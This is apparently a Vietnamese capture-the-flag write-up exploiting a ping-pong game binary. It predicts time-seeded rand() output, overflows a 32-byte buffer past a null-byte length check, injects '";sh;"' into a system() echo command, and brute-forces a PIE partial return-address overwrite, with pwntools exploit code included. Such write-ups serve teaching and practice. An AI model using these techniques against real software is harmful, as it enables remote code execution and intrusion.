# Phân tích code
<img width="932" height="490" alt="image" src="https://github.com/user-attachments/assets/69a815dc-018e-49f7-a3b0-7512cf9dc963" />

Trương chình gọi `rand()` để tạo số ngẫu nhiên qua seed là `time(0)`. Số giả ngẫu nhiên này sau đó đem đi chia lấy phần dư cho 2, trả về kết quả 0 hoặc 1.
Lấy kết quả cuối cùng so sánh với kí tự người dùng nhập vào 0 (l) hay 1 (r).

Sau 20 lần ghi điểm thì mở `getname`.

## Lỗ hổng và mục tiêu khai thác

<img width="645" height="254" alt="image" src="https://github.com/user-attachments/assets/572223cc-aae7-44a1-8596-26c0f5da8b03" />

Lỗ hổng *buffer overflow* cho phép ghi đè 64 BYTES vào buffer 32 BYTES. Chương trình có kiểm tra độ dài chuỗi nhập vào nhưng đơn giản chỉ cần đặt NULL BYTE sau 32 BYTES để bypass rồi ghi đè tiếp.

<img width="632" height="264" alt="image" src="https://github.com/user-attachments/assets/b057489d-2582-4a54-88f7-850a3cc1f9f2" />
<img width="482" height="185" alt="image" src="https://github.com/user-attachments/assets/78f0c257-cb62-4e46-865d-d13eeac01e47" />

Chương trình sẽ đưa chuỗi `echo \"%s\" > /tmp/pingpong_scoreboard` vào biến cmd. Và trong chương trình cũng có hàm `printff` để gọi system thực thi chuỗi trong cmd.
Tuy nhiên, nếu chỉ đưa `/bin/sh` vào thì echo chỉ in ra nội dung y chang. 

Thay vào đó dùng chuỗi `";sh;"`. Chuỗi này sẽ ngắt echo và tạo shell với kích thước dưới 7 BYTES. Nhưng với điều kiện là trong `envp` của chuỗi có đường dẫn `/bin` hay `/usr/bin`.

## Mitigation

<img width="672" height="282" alt="image" src="https://github.com/user-attachments/assets/218aef47-148f-4e99-8057-d126507d76c7" />

PIE bật tức các địa chỉ binary là ngẫu nhiên.

## Bypass rand()
Đầu tiên để tái tạo lại kết quả của `rand()` thì cần tạo biết seed ban đầu là gì. Chương trình dùng `time(0)` tức lấy thời gian hiện tại làm seed. Nếu như script dùng `time(0)` cùng lúc với chương trình thì sẽ tái tạo được seed. 

        for i in range (-5,5):           //brute force thì có thể lệch thời gian với server
    	    p=process(exe.path)
    
    	    p.recvuntil('my game?')
    	    seed=libc.time(0)
    	    libc.srand(seed)
    
    	    for i in range(20):
    		    payload=libc.rand()%2
    		    if payload==0:
    			    p.sendlineafter(b'right',b'l')
    		    else:
    			    p.sendlineafter(b'right',b'r')

## Bypass PIE

<img width="752" height="402" alt="image" src="https://github.com/user-attachments/assets/edff26b7-f8b6-49ec-8f91-07691712895d" />

Ta có thể ghi đè đến saved rip. Tuy nhiên vì PIE nên không thể ghi đè `printff` vào trực tiếp. Tức hiện tại ta sẽ phải brute force 2 BYTES cuối để có khả năng chạy được đến `printff`.

<img width="726" height="27" alt="image" src="https://github.com/user-attachments/assets/9b333506-a6ce-409b-b78c-424d69843182" />
<img width="726" height="27" alt="image" src="https://github.com/user-attachments/assets/f0683a4d-e99a-479e-b9c0-433c373016c4" />

Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuối cố định là `a9`. Có nghĩa chỉ cần chạy brute force đúng 1 BYTE rất nhanh. Bên cạnh đó, vì BYTE 
`a9` là cố định nên các địa chỉ sau cũng tương tự có BYTE cuối cố định. Lấy địa chỉ sau đó 5 BYTES để tránh `push rbp`, căn địa chỉ Stack chia hết cho 16


        while(1):
             ...
                p.sendlineafter(b'Your Name is:',b'";sh;"')    //đưa sh vào system
                
                payload=b'A'*32
                payload+=p64(0)
                payload+=b'\xae'+b'\x12'                        //ghi đè 
                p.sendafter(b'Feedback for the game:',payload)   
                p.recvuntil(b'Thanks for your feedback!')

                try:
		        p.sendline(b'echo ABCD')
		        p.recvuntil(b'ABCD')
		break
	        except:
		        try:
			p.close()
		except:
			pass
